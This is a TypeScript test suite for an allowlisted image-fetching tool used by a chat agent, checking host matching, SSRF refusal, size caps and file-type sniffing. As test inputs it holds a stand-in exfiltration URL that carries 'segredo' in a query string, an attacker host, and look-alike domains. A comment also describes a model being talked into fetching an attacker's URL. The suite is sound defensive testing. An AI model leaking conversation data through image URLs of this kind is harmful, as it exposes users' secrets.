import { afterEach, describe, expect, test } from "bun:test";
import type { StructuredToolInterface } from "@langchain/core/tools";
import { buildNativeTools } from "@/graph/tools/native";
import type { ChatwootClient } from "@/modules/chatwoot/client";
import { fetchImageForDelivery } from "@/modules/images/fetch";
import {
  IMAGE_MAX_BYTES,
  isAllowedImageHost,
  normalizeAllowedHost,
  readSendImageConfig,
} from "@/modules/images/settings";

// Issue #65. An agent that already holds a product image's URL had no way to deliver it: the only
// caller of sendFileAttachment was the Google Drive toolpack, so "send a picture" meant "upload the
// catalogue to Drive first". The tool that closes it fetches a URL the MODEL chose, which is why
// every test below is about what the fetch REFUSES as much as about what it delivers.

const PNG = new Uint8Array([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
]);
const GIF = new Uint8Array([
  0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
]);
const HTML = new TextEncoder().encode("<!doctype html><html><body>não</body>");

interface Call {
  url: string;
  redirect?: RequestRedirect;
}

// Stands in for the remote image host. `body` is delivered as a STREAM, because the byte cap has to
// hold against a server that lies in (or omits) content-length.
function fakeHost(
  body: Uint8Array,
  opts: {
    status?: number;
    contentType?: string;
    contentLength?: string;
    chunkSize?: number;
  } = {},
) {
  const calls: Call[] = [];
  const impl = (async (input: string | URL, init?: RequestInit) => {
    calls.push({ url: String(input), redirect: init?.redirect });
    const chunk = opts.chunkSize ?? 8;
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        for (let i = 0; i < body.length; i += chunk) {
          controller.enqueue(body.slice(i, i + chunk));
        }
        controller.close();
      },
    });
    return new Response(stream, {
      status: opts.status ?? 200,
      headers: {
        "content-type": opts.contentType ?? "image/png",
        ...(opts.contentLength ? { "content-length": opts.contentLength } : {}),
      },
    });
  }) as unknown as typeof fetch;
  return { impl, calls };
}

const noSsrf = async (url: string) => new URL(url);
const HOSTS = { allowedHosts: ["cdn.loja.com.br", "*.imagens.com.br"] };

describe("the operator's host list", () => {
  test("accepts what an operator actually pastes", () => {
    expect(normalizeAllowedHost("CDN.Loja.com.br")).toBe("cdn.loja.com.br");
    expect(normalizeAllowedHost("https://cdn.loja.com.br/img/1.png")).toBe(
      "cdn.loja.com.br",
    );
    expect(normalizeAllowedHost("cdn.loja.com.br:443")).toBe("cdn.loja.com.br");
    expect(normalizeAllowedHost("*.loja.com.br")).toBe("*.loja.com.br");
    expect(normalizeAllowedHost("  ")).toBeNull();
    expect(normalizeAllowedHost("localhost")).toBeNull();
    expect(normalizeAllowedHost(42)).toBeNull();
  });

  test("a wildcard covers the domain and its subdomains, and nothing that merely ends like it", () => {
    const hosts = ["*.loja.com.br"];
    expect(isAllowedImageHost("loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("cdn.loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("a.b.loja.com.br", hosts)).toBe(true);
    // The one that matters: a look-alike domain someone else registered.
    expect(isAllowedImageHost("evil-loja.com.br", hosts)).toBe(false);
    expect(isAllowedImageHost("loja.com.br.evil.com", hosts)).toBe(false);
  });

  test("an exact entry stays exact", () => {
    const hosts = ["cdn.loja.com.br"];
    expect(isAllowedImageHost("cdn.loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("outro.loja.com.br", hosts)).toBe(false);
  });

  test("the stored config normalizes, dedups and survives junk", () => {
    expect(
      readSendImageConfig({
        sendImage: {
          allowedHosts: [
            "https://cdn.loja.com.br/x",
            "CDN.loja.com.br",
            "",
            null,
            "*.imagens.com.br",
          ],
        },
      }),
    ).toEqual({ allowedHosts: ["cdn.loja.com.br", "*.imagens.com.br"] });
    expect(readSendImageConfig({})).toEqual({ allowedHosts: [] });
    expect(
      readSendImageConfig({ sendImage: { allowedHosts: "tudo" } }),
    ).toEqual({ allowedHosts: [] });
  });
});

describe("fetching the image", () => {
  test("an allowed host delivers, with the type read from the file itself", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/fotos/Camiseta Azul.PNG?v=2",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.mime).toBe("image/png");
    expect(res.fileName).toBe("CamisetaAzul.png");
    expect(new Uint8Array(res.bytes)).toEqual(PNG);
    // A redirect is a second URL nobody allowlisted.
    expect(host.calls[0]?.redirect).toBe("error");
  });

  test("an unlisted host is refused before anything is even resolved", async () => {
    const host = fakeHost(PNG);
    let resolved = 0;
    const res = await fetchImageForDelivery(
      "https://cdn.atacante.com/foto.png",
      HOSTS,
      {
        fetchImpl: host.impl,
        assertSafe: async (u) => {
          resolved++;
          return new URL(u);
        },
      },
    );
    expect(res).toMatchObject({ ok: false, reason: "host_not_allowed" });
    expect(host.calls).toEqual([]);
    expect(resolved).toBe(0);
  });

  // An empty list is the default, so granting the tool without configuring it must not open a
  // fetcher for arbitrary URLs.
  test("no configured host refuses everything", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      { allowedHosts: [] },
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "no_hosts_configured" });
    expect(host.calls).toEqual([]);
  });

  test("an allowed host on a private address is still refused", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      HOSTS,
      {
        fetchImpl: host.impl,
        assertSafe: async () => {
          throw new (await import("@/lib/ssrf")).SsrfError("private address");
        },
      },
    );
    expect(res).toMatchObject({ ok: false, reason: "invalid_url" });
    expect(host.calls).toEqual([]);
  });

  test("a body past the cap is cut off, whatever content-length claimed", async () => {
    const big = new Uint8Array(IMAGE_MAX_BYTES + 1_024);
    big.set(PNG);
    const host = fakeHost(big, {
      contentLength: "10",
      chunkSize: 64 * 1024,
    });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/enorme.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "too_large" });
  });

  test("a page that claims to be a PNG is not one", async () => {
    const host = fakeHost(HTML, { contentType: "image/png" });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "not_an_image" });
  });

  test("a type declared wrong but genuinely an image goes through, as itself", async () => {
    const host = fakeHost(GIF, { contentType: "application/octet-stream" });
    const res = await fetchImageForDelivery(
      "https://promos.imagens.com.br/banner",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: true, mime: "image/gif" });
    if (res.ok) expect(res.fileName).toBe("banner.gif");
  });

  test("an HTTP error is reported as one", async () => {
    const host = fakeHost(PNG, { status: 404 });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/sumiu.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({
      ok: false,
      reason: "http_error",
      detail: "404",
    });
  });

  test("a URL that is not one is refused, not thrown", async () => {
    const res = await fetchImageForDelivery("nao é uma url", HOSTS, {
      assertSafe: noSsrf,
    });
    expect(res).toMatchObject({ ok: false, reason: "invalid_url" });
  });
});

interface Sent {
  conversationId: number;
  fileName: string;
  mime: string;
  bytes: number;
  caption?: string;
}

function stubClient(sent: Sent[], fail = false): ChatwootClient {
  return {
    sendFileAttachment: async (
      conversationId: number,
      bytes: ArrayBuffer,
      fileName: string,
      mime: string,
      opts: { caption?: string } = {},
    ) => {
      if (fail) throw new Error("chatwoot 502");
      sent.push({
        conversationId,
        fileName,
        mime,
        bytes: bytes.byteLength,
        caption: opts.caption,
      });
      return null;
    },
  } as unknown as ChatwootClient;
}

function sendImage(
  tools: StructuredToolInterface[],
): StructuredToolInterface | undefined {
  return tools.find((t) => t.name === "send_image");
}

const original = globalThis.fetch;
afterEach(() => {
  globalThis.fetch = original;
});

describe("the send_image tool", () => {
  test("delivers the image as an attachment with its caption", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
      caption: "Essa é a azul",
    });
    expect(String(out)).toContain("Imagem enviada");
    expect(sent).toEqual([
      {
        conversationId: 42,
        fileName: "camiseta.png",
        mime: "image/png",
        bytes: PNG.byteLength,
        caption: "Essa é a azul",
      },
    ]);
  });

  // The whole point of binding the list to the config: a URL the model was talked into using does
  // not become a fetch just because the model asked nicely.
  test("a URL outside the list sends nothing and tells the agent what to do instead", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://exfiltra.example.com/pixel.png?dados=segredo",
    });
    expect(String(out)).toContain("não está na lista");
    expect(String(out)).toContain("link em texto");
    expect(sent).toEqual([]);
    expect(host.calls).toEqual([]);
  });

  test("with no host configured the tool says so instead of trying", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
    });
    expect(String(out)).toContain("nenhum host foi liberado");
    expect(sent).toEqual([]);
    expect(host.calls).toEqual([]);
  });

  test("a Chatwoot failure degrades instead of losing the turn", async () => {
    const host = fakeHost(PNG);
    const tools = buildNativeTools(
      {
        client: stubClient([], true),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
    });
    expect(String(out)).toContain("link em texto");
  });

  // The model has to know where it may point the tool BEFORE it calls it, or it burns a turn
  // guessing. The hosts ride in the description's XML block, like every other per-turn ground truth.
  test("the description grounds the model on the configured hosts", () => {
    const withHosts = sendImage(
      buildNativeTools(
        { client: stubClient([]), conversationId: 1, sendImage: HOSTS },
        ["send_image"],
      ),
    );
    expect(withHosts?.description).toContain("<host>cdn.loja.com.br</host>");
    expect(withHosts?.description).toContain("<host>*.imagens.com.br</host>");
    const without = sendImage(
      buildNativeTools({ client: stubClient([]), conversationId: 1 }, [
        "send_image",
      ]),
    );
    expect(without?.description).toContain("Nenhum host liberado");
  });
});
